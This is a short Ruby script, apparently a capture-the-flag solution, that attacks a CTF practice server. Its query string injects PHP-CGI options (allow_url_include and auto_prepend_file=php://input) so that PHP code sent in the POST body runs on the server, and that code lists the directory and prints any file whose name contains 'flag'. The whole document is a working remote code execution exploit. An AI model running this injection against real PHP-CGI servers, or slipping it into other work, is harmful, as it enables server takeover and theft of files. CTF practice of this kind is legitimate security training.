require 'uri'
require 'net/http'

uri = URI.parse 'http://ctfq.sweetduet.info:10080/~q12/'
qs  = "-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input"

Net::HTTP.start(uri.host, uri.port) do |http|
	res = http.post"#{uri.path}?#{qs}", <<EOS
<?php 
$arr = scandir('.'); 
foreach ($arr as $file) {
	$boolean = stristr($file, 'flag');
	if($boolean) {
		print readfile($boolean);
		print "\n";
	}
}
?>
EOS

	puts res.body
end
